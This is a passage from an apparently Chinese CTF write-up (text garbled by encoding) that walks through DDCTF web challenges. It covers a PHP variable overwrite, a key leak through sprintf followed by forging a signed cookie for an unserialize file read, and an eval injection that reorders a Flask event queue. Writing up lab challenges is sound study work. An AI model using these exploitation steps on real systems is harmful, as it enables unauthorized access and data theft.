$file.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; $txt = base64_encode(file_get_contents($file)); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/gif;base64,\u0026#34;.$txt.\u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; /* * Can you find the flag file? * */ ?\u0026gt;æ‰¾åˆ°ç±»ä¼¼çš„åŸé¢˜ï¼Œä½†æ˜¯åŸé¢˜åˆ©ç”¨äº†.ideaæ–‡ä»¶æ³„éœ²ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰ï¼Œç•™ä¸‹çš„åªæ˜¯ä¸€ä¸ªæ·±æ·±çš„å·¨å‘ï¼Œé¦–å…ˆçœ‹ php é¡¶éƒ¨é“¾æ¥æ‰¾åˆ°åšå®¢ï¼Œç„¶åå‘ç°è¿™ç¯‡åšå®¢æ—¥æœŸä¸å¯¹ã€‚æ‰¾åˆ°è¯¥åšä¸»7æœˆ4æ—¥çš„åšå®¢ï¼Œå‘ç°æ˜¯ä¸€ç¯‡åä¸ºvim å¼‚å¸¸é€€å‡º swpæ–‡ä»¶æç¤ºçš„åšå®¢ï¼Œçœ‹æ–‡ç« å†…å®¹å‘ç°æœ‰ä¸€ä¸ªæ¢å¤.practice.txt.swpçš„æ“ä½œã€‚\nç»“æœè¿™é‡Œæ˜¯ä¸ªå·¨å‘ï¼Œæœ€åæ˜¯è¦æ‹¿åˆ°çš„æ–‡ä»¶æ˜¯practice.txt.swpï¼Œå¹¶æ²¡æœ‰å¼€å¤´çš„.ç¬¦å·\u0026hellip;ç„¶åæç¤ºf1ag!ddctf.phpï¼Œç„¶åå»è¯»è¿™ä¸ªæ–‡ä»¶æºç ï¼Œå¾—åˆ°\n\u0026lt;?php include(\u0026#39;config.php\u0026#39;); $k = \u0026#39;hello\u0026#39;; extract($_GET); if(isset($uid)) { $content=trim(file_get_contents($k)); if($uid==$content) { echo $flag; } else { echo\u0026#39;hello\u0026#39;; } } ?\u0026gt;å¾ˆç®€å•çš„å˜é‡è¦†ç›–ã€‚\n \nWeb 2 WEB ç­¾åˆ°é¢˜ Description {% colorquote info %} NULL\né¢˜ç›®åœ°å€ï¼šhttp://117.51.158.44/index.php\n{% endcolorquote %}\nHacking url:app/Application.php\nClass Application { var $path = \u0026#39;\u0026#39;; public function response($data, $errMsg = \u0026#39;success\u0026#39;) { $ret = [\u0026#39;errMsg\u0026#39; =\u0026gt; $errMsg, \u0026#39;data\u0026#39; =\u0026gt; $data]; $ret = json_encode($ret); header(\u0026#39;Content-type: application/json\u0026#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = \u0026#39;admin\u0026#39;; if(!empty($_SERVER[\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;]) \u0026amp;\u0026amp; $_SERVER[\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;] == $DIDICTF_ADMIN) { $this-\u0026gt;response(\u0026#39;æ‚¨å½“å‰å½“å‰æƒé™ä¸ºç®¡ç†å‘˜----è¯·è®¿é—®:app/fL2XID2i0Cdh.php\u0026#39;); return TRUE; }else{ $this-\u0026gt;response(\u0026#39;æŠ±æ­‰ï¼Œæ‚¨æ²¡æœ‰ç™»é™†æƒé™ï¼Œè¯·è·å–æƒé™åè®¿é—®-----\u0026#39;,\u0026#39;error\u0026#39;); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace(\u0026#39;../\u0026#39;,\u0026#39;\u0026#39;,$path); $path=str_replace(\u0026#39;..\\\\\u0026#39;,\u0026#39;\u0026#39;,$path); return $path; } public function __destruct() { if(empty($this-\u0026gt;path)) { exit(); }else{ $path = $this-\u0026gt;sanitizepath($this-\u0026gt;path); if(strlen($path) !== 18) { exit(); } $this-\u0026gt;response($data=file_get_contents($path),\u0026#39;Congratulations\u0026#39;); } exit(); } } url:app/Session.php\ninclude \u0026#39;Application.php\u0026#39;; class Session extends Application { //keyå»ºè®®ä¸º8ä½å­—ç¬¦ä¸²  var $eancrykey = \u0026#39;\u0026#39;; var $cookie_expiration\t= 7200; var $cookie_name = \u0026#39;ddctf_id\u0026#39;; var $cookie_path\t= \u0026#39;\u0026#39;; var $cookie_domain\t= \u0026#39;\u0026#39;; var $cookie_secure\t= FALSE; var $activity = \u0026#34;DiDiCTF\u0026#34;; public function index() { if(parent::auth()) { $this-\u0026gt;get_key(); if($this-\u0026gt;session_read()) { $data = \u0026#39;DiDI Welcome you %s\u0026#39;; $data = sprintf($data,$_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]); parent::response($data,\u0026#39;sucess\u0026#39;); }else{ $this-\u0026gt;session_create(); $data = \u0026#39;DiDI Welcome you\u0026#39;; parent::response($data,\u0026#39;sucess\u0026#39;); } } } private function get_key() { //eancrykey and flag under the folder  $this-\u0026gt;eancrykey = file_get_contents(\u0026#39;../config/key.txt\u0026#39;); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this-\u0026gt;cookie_name]; if(!isset($session)) { parent::response(\u0026#34;session not found\u0026#34;,\u0026#39;error\u0026#39;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-\u0026gt;eancrykey.$session)) { parent::response(\u0026#34;the cookie data not match\u0026#34;,\u0026#39;error\u0026#39;); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session[\u0026#39;session_id\u0026#39;]) OR !isset($session[\u0026#39;ip_address\u0026#39;]) OR !isset($session[\u0026#39;user_agent\u0026#39;])){ return FALSE; } if(!empty($_POST[\u0026#34;nickname\u0026#34;])) { $arr = array($_POST[\u0026#34;nickname\u0026#34;],$this-\u0026gt;eancrykey); $data = \u0026#34;Welcome my friend %s\u0026#34;; foreach ($arr as $k =\u0026gt; $v) { $data = sprintf($data,$v); } parent::response($data,\u0026#34;Welcome\u0026#34;); } if($session[\u0026#39;ip_address\u0026#39;] != $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) { parent::response(\u0026#39;the ip addree not match\u0026#39;.\u0026#39;error\u0026#39;); return FALSE; } if($session[\u0026#39;user_agent\u0026#39;] != $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]) { parent::response(\u0026#39;the user agent not match\u0026#39;,\u0026#39;error\u0026#39;); return FALSE; } return TRUE; } private function session_create() { $sessionid = \u0026#39;\u0026#39;; while(strlen($sessionid) \u0026lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( \u0026#39;session_id\u0026#39; =\u0026gt; md5(uniqid($sessionid,TRUE)), \u0026#39;ip_address\u0026#39; =\u0026gt; $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;], \u0026#39;user_agent\u0026#39; =\u0026gt; $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;], \u0026#39;user_data\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-\u0026gt;eancrykey.$cookiedata); $expire = $this-\u0026gt;cookie_expiration + time(); setcookie( $this-\u0026gt;cookie_name, $cookiedata, $expire, $this-\u0026gt;cookie_path, $this-\u0026gt;cookie_domain, $this-\u0026gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-\u0026gt;index(); æˆ‘ä»¬å¯ä»¥çœ‹åˆ° Application.php ä¸­çš„å…³é”®ä»£ç \npublic function __destruct(){ //... \t$this-\u0026gt;response($data = file_get_contents($path), \u0026#39;Congratulations\u0026#39;); //... } è€Œä¸”åœ¨session.phpä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€å¤„ååºåˆ—åŒ–çš„åœ°æ–¹ï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾å°±éœ€è¦æˆ‘ä»¬å»æ„å»ºä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ï¼Œåˆ©ç”¨è¿™é‡Œå»è¯»å–../config/flag.txt\næˆ‘ä»¬åœ¨session.phpä¸­å‘ç°å…³é”®ä»£ç \nif (!empty($_POST[\u0026#34;nickname\u0026#34;])) { $arr = array($_POST[\u0026#34;nickname\u0026#34;], $this-\u0026gt;eancrykey); $data = \u0026#34;Welcome my friend %s\u0026#34;; foreach ($arr as $k =\u0026gt; $v) { $data = sprintf($data, $v); } parent::response($data, \u0026#34;Welcome\u0026#34;); } è¿™é‡Œå¾ªç¯ä½¿ç”¨sprintfæ ¼å¼åŒ–æ‰“å°$arrï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©ç¬¬äºŒæ¬¡å­˜åœ¨ä¸€ä¸ª%sï¼Œå³å¯è®©ä»–æ‰“å°å‡º$this-\u0026gt;eacrykeyï¼Œæ‰€ä»¥å¯ä»¥æ„é€ nickname=%så³å¯å¾—åˆ°$this-\u0026gt;eacrykeyä¸º EzblrbNS\n \nä¹‹åæˆ‘ä»¬å¯ä»¥å‘ç°ä¸»è¦å°±æ˜¯è¦æ„é€ $sessionè¿™ä¸ªå˜é‡æ¥è§¦å‘session_read()å‡½æ•°ä¸­çš„$session = unserialize($session);\näºæ˜¯æˆ‘ä»¬å¯ä»¥å…ˆä»æœåŠ¡å™¨è·å–session_create()å¾—åˆ°çš„æ•°æ®å¦‚ä¸‹\na:4:{s:10:\u0026quot;session_id\u0026quot;;s:32:\u0026quot;9e887a62624202e40d11881772b19569\u0026quot;;s:10:\u0026quot;ip_address\u0026quot;;s:11:\u0026quot;157.0.25.86\u0026quot;;s:10:\u0026quot;user_agent\u0026quot;;s:82:\u0026quot;Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.14;+rv:66.0)+Gecko/20100101+Firefox/66.0\u0026quot;;s:9:\u0026quot;user_data\u0026quot;;s:0:\u0026quot;\u0026quot;;}a170c04974e03dc5cc763c0ab32d6905; æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ° ip äº†ï¼Œæ¥ä¸‹é‡Œæˆ‘ä»¬åªéœ€è¦å»æ„é€ ååºåˆ—åŒ–Applicationè¿™ä¸ªç±»å°±å¥½äº†ã€‚\nè¿™ä¸ªç±»ä¹Ÿå¾ˆç®€å•ï¼Œä¸»è¦å°±æ˜¯ç»•è¿‡å®ƒçš„è¿™ä¸ªsanitizepath()æ–¹æ³•å³å¯ï¼Œæˆ‘ä»¬åŒå†™å°±å¯ä»¥ç»•è¿‡äº†ã€‚\nvar $path = \u0026#34;..././config/flag.txt\u0026#34;; æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ session.php ä¸­è‡ªå·±æœ¬åœ°æ­ä¸€ä¸‹\nprivate function session_create(){ $sessionid = \u0026#39;\u0026#39;; while (strlen($sessionid) \u0026lt; 32) { $sessionid .= mt_rand(0, mt_getrandmax()); } $a = new Application(); $userdata = array( \u0026#39;session_id\u0026#39; =\u0026gt; \u0026#39;272a4339b6b9340dad9466656d869286\u0026#39;, \u0026#39;ip_address\u0026#39; =\u0026gt; \u0026#39;157.0.25.86\u0026#39;, \u0026#39;user_agent\u0026#39; =\u0026gt; $a, \u0026#39;user_data\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata . md5($this-\u0026gt;eancrykey . $cookiedata); $expire = $this-\u0026gt;cookie_expiration + time(); setcookie( $this-\u0026gt;cookie_name, $cookiedata, $expire, $this-\u0026gt;cookie_path, $this-\u0026gt;cookie_domain, $this-\u0026gt;cookie_secure ); } session_id ä¿®æ”¹ä¸ºæœåŠ¡å™¨è·å–å¾—åˆ°çš„ session_id å³å¯ï¼Œip_address æœåŠ¡å™¨ä¹Ÿè¿”å›äº†ï¼Œå¡«ä¸Šå»äº†å°±å¥½äº†ã€‚è¿™æ ·æˆ‘ä»¬æœ¬åœ°æ­èµ·ç¯å¢ƒï¼Œä» http å¤´ä¸­æ‹¿åˆ° cookie ï¼Œç”¨è¿™ä¸ª cookie è®¿é—®æœåŠ¡å™¨å³å¯æ‹¿åˆ° flag äº†ã€‚\nWeb 3 Upload-IMG Description {% colorquote info %}\nhttp://117.51.148.166/upload.php userï¼šdd@ctf passï¼šDD@ctf#000\n{% endcolorquote %}\nHacking CREATOR: gd-jpeg v1.0 (using IJG JPEG v80)\nå…¶ä»–äººå¯ä»¥ç›´æ¥ç”¨æœåˆ°çš„ jpg_payload.php å¯ä»¥ç›´æ¥éšä¾¿æ‹¿ä¸€ä¸ªå›¾ç‰‡éƒ½å¯ä»¥æ‹¿åˆ° flag ï¼Œè€Œæˆ‘å°±ä¸è¡Œäº†â€¦åº”è¯¥æ˜¯å›¾ç‰‡çš„åŸå› â€¦.\næœ€åè‡ªå·±æŒ‰ç…§è¿™ä¸ª GitHub ä»“åº“ ç”Ÿæˆæ‹¿åˆ°äº† flag\u0026hellip;\nWeb 4 homebrew event loop Description {% colorquote info %}\nhttp://116.85.48.107:5002/d5af31f96147e657 Flagæ ¼å¼ï¼šDDCTF{.....}ï¼Œä¹Ÿå°±æ˜¯è¯·æ‰‹åŠ¨åŒ…è£¹ä¸ŠDDCTF{}\n{% endcolorquote %}\nHacking # -*- encoding: utf-8 -*- # written in python 2.7 __author__ = \u0026#39;garzon\u0026#39; from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = \u0026#39;*********************\u0026#39; # censored url_prefix = \u0026#39;/d5af31f96147e657\u0026#39; def FLAG(): return \u0026#39;FLAG_is_here_but_i_wont_show_you\u0026#39; # censored def trigger_event(event): session[\u0026#39;log\u0026#39;].append(event) if len(session[\u0026#39;log\u0026#39;]) \u0026gt; 5: session[\u0026#39;log\u0026#39;] = session[\u0026#39;log\u0026#39;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: pass def execute_event_loop(): valid_event_chars = set(\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#\u0026#39;) resp = None while len(request.event_queue) \u0026gt; 0: event = request.event_queue[0] # `event` is something like \u0026#34;action:ACTION;ARGS0#ARGS1#ARGS2......\u0026#34; request.event_queue = request.event_queue[1:] if not event.startswith((\u0026#39;action:\u0026#39;, \u0026#39;func:\u0026#39;)): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == \u0026#39;a\u0026#39; action = get_mid_str(event, \u0026#39;:\u0026#39;, \u0026#39;;\u0026#39;) args = get_mid_str(event, action+\u0026#39;;\u0026#39;).split(\u0026#39;#\u0026#39;) try: event_handler = eval(action + (\u0026#39;_handler\u0026#39; if is_action else \u0026#39;_function\u0026#39;)) ret_val = event_handler(args) except RollBackException: if resp is None: resp = \u0026#39;\u0026#39; resp += \u0026#39;ERROR! All transactions have been cancelled. \u0026lt;br /\u0026gt;\u0026#39; resp += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;index\u0026#34;\u0026gt;Go back to index.html\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; session[\u0026#39;num_items\u0026#39;] = request.prev_session[\u0026#39;num_items\u0026#39;] session[\u0026#39;points\u0026#39;] = request.prev_session[\u0026#39;points\u0026#39;] break except Exception, e: if resp is None: resp = \u0026#39;\u0026#39; #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == \u0026#39;\u0026#39;: resp = (\u0026#39;404 NOT FOUND\u0026#39;, 404) session.modified = True return resp @app.route(url_prefix+\u0026#39;/\u0026#39;) def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == \u0026#39;\u0026#39; or (not querystring.startswith(\u0026#39;action:\u0026#39;)) or len(querystring) \u0026gt; 100: querystring = \u0026#39;action:index;False#False\u0026#39; if \u0026#39;num_items\u0026#39; not in session: session[\u0026#39;num_items\u0026#39;] = 0 session[\u0026#39;points\u0026#39;] = 3 session[\u0026#39;log\u0026#39;] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() # handlers/functions below -------------------------------------- def view_handler(args): page = args[0] html = \u0026#39;\u0026#39; html += \u0026#39;[INFO] you have {}diamonds, {}points now.\u0026lt;br /\u0026gt;\u0026#39;.format(session[\u0026#39;num_items\u0026#39;], session[\u0026#39;points\u0026#39;]) if page == \u0026#39;index\u0026#39;: html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:index;True%23False\u0026#34;\u0026gt;View source code\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;shop\u0026#34;\u0026gt;Go to e-shop\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;reset\u0026#34;\u0026gt;Reset\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; elif page == \u0026#39;shop\u0026#39;: html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:buy;1\u0026#34;\u0026gt;Buy a diamond (1 point)\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; elif page == \u0026#39;reset\u0026#39;: del session[\u0026#39;num_items\u0026#39;] html += \u0026#39;Session reset.\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;index\u0026#34;\u0026gt;Go back to index.html\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; return html def index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == \u0026#39;True\u0026#39;: source = open(\u0026#39;eventLoop.py\u0026#39;, \u0026#39;r\u0026#39;) html = \u0026#39;\u0026#39; if bool_download_source != \u0026#39;True\u0026#39;: html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:index;True%23True\u0026#34;\u0026gt;Download this .py file\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;index\u0026#34;\u0026gt;Go back to index.html\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; for line in source: if bool_download_source != \u0026#39;True\u0026#39;: html += line.replace(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\u0026amp;amp;\u0026#39;).replace(\u0026#39;\\t\u0026#39;, \u0026#39;\u0026amp;nbsp;\u0026#39;*4).replace(\u0026#39; \u0026#39;,\u0026#39;\u0026amp;nbsp;\u0026#39;).replace(\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026amp;lt;\u0026#39;).replace(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026amp;gt;\u0026#39;).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026lt;br /\u0026gt;\u0026#39;) else: html += line source.close() if bool_download_source == \u0026#39;True\u0026#39;: headers = {} headers[\u0026#39;Content-Type\u0026#39;] = \u0026#39;text/plain\u0026#39; headers[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment; filename=serve.py\u0026#39; return Response(html, headers=headers) else: return html else: trigger_event(\u0026#39;action:view;index\u0026#39;) def buy_handler(args): num_items = int(args[0]) if num_items \u0026lt;= 0: return \u0026#39;invalid number({}) of diamonds to buy\u0026lt;br /\u0026gt;\u0026#39;.format(args[0]) session[\u0026#39;num_items\u0026#39;] += num_items trigger_event([\u0026#39;func:consume_point;{}\u0026#39;.format(num_items), \u0026#39;action:view;index\u0026#39;]) def consume_point_function(args): point_to_consume = int(args[0]) if session[\u0026#39;points\u0026#39;] \u0026lt; point_to_consume: raise RollBackException() session[\u0026#39;points\u0026#39;] -= point_to_consume def show_flag_function(args): flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return \u0026#39;You naughty boy! ;) \u0026lt;br /\u0026gt;\u0026#39; def get_flag_handler(args): if session[\u0026#39;num_items\u0026#39;] \u0026gt;= 5: trigger_event(\u0026#39;func:show_flag;\u0026#39; + FLAG()) # show_flag_function has been disabled, no worries trigger_event(\u0026#39;action:view;index\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=False, host=\u0026#39;0.0.0.0\u0026#39;) ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ Flask æ¡†æ¶ï¼Œæä¾›ä½¿ç”¨ points è´­ä¹° diamonds çš„åŠŸèƒ½ï¼Œç„¶åå°†æ“ä½œè®°å½•å†™è¿›session['log'] é‡Œé¢ã€‚\næ•´ä¸ªä»£ç è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè€Œä¸”æ¼æ´ç‚¹ä¹Ÿç›¸å¯¹æ¯”è¾ƒæ˜æ˜¾ã€‚å…¶å®æ¯ä¸ªè¯­è¨€çš„evalå‡½æ•°éƒ½å·®ä¸å¤šï¼Œæ¯”å¦‚è¿™é‡Œ python çš„evalå‡½æ•°ï¼Œç±»ä¼¼äº php ä¸­çš„evalï¼Œä¹Ÿå¯ä»¥å°†evalä¸­çš„å­—ç¬¦ä¸²å½“ä½œä»£ç æ¥å¤„ç†ã€‚\næ‰€ä»¥è¿™æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿè¿™å°±æ„å‘³ç€å¯ä»¥ä½¿ç”¨#æ³¨é‡Šæˆ‘ä»¬ä¸éœ€è¦çš„ä»£ç ã€‚\nä¸¾ä¸ªä¾‹å­ï¼š\n\u0026gt;\u0026gt;\u0026gt; eval(\u0026#34;print(1)\u0026#34;) 1 \u0026gt;\u0026gt;\u0026gt; eval(\u0026#34;print(1)#do something)\u0026#34;) 1 æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œåˆ©ç”¨é¢˜ç›®ä¸­çš„event_handleræ¥æ‰§è¡Œä»»æ„å‡½æ•°ã€‚\n \nåˆ©ç”¨#æˆåŠŸç»•è¿‡äº†åç¼€çš„é™åˆ¶æ‰§è¡Œäº†show_flag_functionå‡½æ•°ã€‚\nè™½ç„¶å¯ä»¥ç›´æ¥æ‰§è¡ŒgetFlagå‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°è¿˜æ˜¯æœ‰ä¸€ä¸ªé™åˆ¶session['num_items'] \u0026gt;= 5ï¼Œå³ä½¿å¯ä»¥ç›´æ¥æ‰§è¡Œä½†æ˜¯å› ä¸ºè¿™ä¸ªåˆ¤æ–­ä¹Ÿæ— æ³•ç»•è¿‡ã€‚æ‰€ä»¥è¿™é‡Œå¯ä»¥æœ‰ä¸€äº›æ€è·¯ï¼Œæ¯”å¦‚æ‰¾ä¸€ä¸ªå¯ä»¥ç”±intå‡½æ•°è½¬æ¢æˆè´Ÿæ•°çš„æ•°ï¼Œæˆ–è€…ç›´æ¥æ‰“å°å‡½æ•°ä»€ä¹ˆã€‚ä½†æ˜¯ä¸¤ç§åŸºæœ¬éƒ½èµ°ä¸é€š\u0026hellip;\nCTF é­…åŠ›æ‰€åœ¨å¯èƒ½å°±æ˜¯å¯ä»¥è®©ä½ åˆ©ç”¨ä½ èƒ½åˆ©ç”¨çš„ä¸€åˆ‡å»åˆ›é€ ä¸€äº›æ–°çš„é€”å¾„è¾¾åˆ°è‡ªå·±ç›®çš„ã€‚\næ—¢ç„¶è¦ç»•è¿‡session['num_items'] \u0026gt;= 5çš„åˆ¤æ–­ï¼Œæˆ‘ä»¬å°±éœ€è¦é€šè¿‡buy_handleræ¥å¢åŠ è‡ªå·±çš„ç‰©å“æ•°ï¼Œç„¶è€Œè¿™ä¸ªå‡½æ•°é‡Œé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°\ndef buy_handler(args): num_items = int(args[0]) if num_items \u0026lt;= 0: return \u0026#39;invalid number({}) of diamonds to buy\u0026lt;br /\u0026gt;\u0026#39;.format(args[0]) session[\u0026#39;num_items\u0026#39;] += num_items trigger_event([\u0026#39;func:consume_point;{}\u0026#39;.format(num_items), \u0026#39;action:view;index\u0026#39;]) æœ€åä¸€è¡Œå¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨consume_point_functionï¼Œè€Œæ˜¯é€šè¿‡è°ƒç”¨trigger_eventæ¥è°ƒç”¨èŠ±è´¹çš„å‡½æ•°ã€‚\nç„¶è€Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°trigger_eventå‡½æ•°\ndef trigger_event(event): session[\u0026#39;log\u0026#39;].append(event) if len(session[\u0026#39;log\u0026#39;]) \u0026gt; 5: session[\u0026#39;log\u0026#39;] = session[\u0026#39;log\u0026#39;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) åªä¸è¿‡æ˜¯ç”¨æ¥å¢åŠ sessionè®°å½•è€Œå·²ï¼Œå¹¶æ²¡æœ‰ç«‹å³å»è°ƒç”¨consume_point_functionï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬åœ¨buy_handlerä¸consume_point_functionä¸¤ä¸ªå‡½æ•°ä¹‹é—´æ‰§è¡Œget_Flagå‡½æ•°ï¼Œå°±å¯ä»¥å…ˆå¢åŠ è‡ªå·±çš„itemæ¥ç»•è¿‡get_Flagå‡½æ•°å¯¹äºitemçš„åˆ¤æ–­ï¼Œå°½ç®¡ä¹‹åä¼šæ‰§è¡Œ consume_point_functionå‡½æ•°ï¼Œä½†æ˜¯ Flag å·²ç»è¢«æˆ‘ä»¬æ‰“å°å‡ºæ¥äº†ï¼Œæ‰€ä»¥åé¢å³ä½¿ä¼šå›æ»šä¹Ÿæ— å…³ç´§è¦äº†ã€‚\næ‰€ä»¥å¦‚ä½•æ„é€ è¿™ä¸ª payload è¾¾åˆ°æˆ‘ä»¬åœ¨buy_handlerä¹‹åç«‹å³æ‰§è¡Œget_Flagå‡½æ•°å‘¢ã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹æ•´ä¸ªä»£ç çš„é€»è¾‘ã€‚é¦–å…ˆä»£ç ä¼šè¿›å…¥entry_pointå‡½æ•°ï¼Œå¹¶å°†querystringä¼ å…¥trigger_eventå‡½æ•°ï¼Œtrigger_eventå°†è¡ŒåŠ¨è®°å½•åˆ°session['log']å½“ä¸­ï¼Œæ¥ç€æ‰§è¡Œexecute_event_loopå‡½æ•°ã€‚\næˆ‘ä»¬é‡ç‚¹æ¥çœ‹execute_event_loopè¿™ä¸ªå‡½æ•°ã€‚\ndef execute_event_loop(): valid_event_chars = set(\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#\u0026#39;) resp = None while len(request.event_queue) \u0026gt; 0: event = request.event_queue[0] # `event` is something like \u0026#34;action:ACTION;ARGS0#ARGS1#ARGS2......\u0026#34; request.event_queue = request.event_queue[1:] if not event.startswith((\u0026#39;action:\u0026#39;, \u0026#39;func:\u0026#39;)): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == \u0026#39;a\u0026#39; action = get_mid_str(event, \u0026#39;:\u0026#39;, \u0026#39;;\u0026#39;) args = get_mid_str(event, action+\u0026#39;;\u0026#39;).split(\u0026#39;#\u0026#39;) try: event_handler = eval(action + (\u0026#39;_handler\u0026#39; if is_action else \u0026#39;_function\u0026#39;)) ret_val = event_handler(args) except RollBackException: if resp is None: resp = \u0026#39;\u0026#39; resp += \u0026#39;ERROR! All transactions have been cancelled. \u0026lt;br /\u0026gt;\u0026#39; resp += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;index\u0026#34;\u0026gt;Go back to index.html\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; session[\u0026#39;num_items\u0026#39;] = request.prev_session[\u0026#39;num_items\u0026#39;] session[\u0026#39;points\u0026#39;] = request.prev_session[\u0026#39;points\u0026#39;] break except Exception, e: if resp is None: resp = \u0026#39;\u0026#39; #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == \u0026#39;\u0026#39;: resp = (\u0026#39;404 NOT FOUND\u0026#39;, 404) session.modified = True return resp è¿™ä¸ªå‡½æ•°è¿›å…¥å¾ªç¯æ‰§è¡Œå‡½æ•°çš„æ¡ä»¶ä¸ºwhile len(request.event_queue) \u0026gt; 0ï¼Œè€Œtrigger_eventå‡½æ•°æ˜¯å¯ä»¥æ§åˆ¶request.event_queueçš„å…³é”®ï¼Œæ‰€ä»¥æŒ‰ç…§æˆ‘ä»¬ä¹‹å‰çš„æ€è·¯ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥æ§åˆ¶æˆ‘ä»¬çš„æ‰§è¡Œé¡ºåºå‘¢ï¼Ÿ\nä¾‹å¦‚æˆ‘ä»¬å¯ä»¥å…ˆå°è¯•æ„é€ action:trigger_event%23;action:buy;8ï¼Œæˆ‘ä»¬æœ¬åœ°å¯ä»¥é€šè¿‡app.logger.infoæ¥æŸ¥çœ‹execute_event_loopå¾ªç¯ä¸­çš„actionä¸argså‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°\n \nå¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†but_handlerå‡½æ•°ï¼Œæˆ‘ä»¬æ³¨æ„trigger_eventä¸­æ˜¯å¯ä»¥æ¥å—æ•°ç»„çš„\nif type(event) == type([]): request.event_queue += event å¯¹äºæ•°ç»„çš„å¤„ç†ï¼Œä»–ä¼šæŒ¨ä¸ªåŠ å…¥åˆ°request.event_queueï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¼ 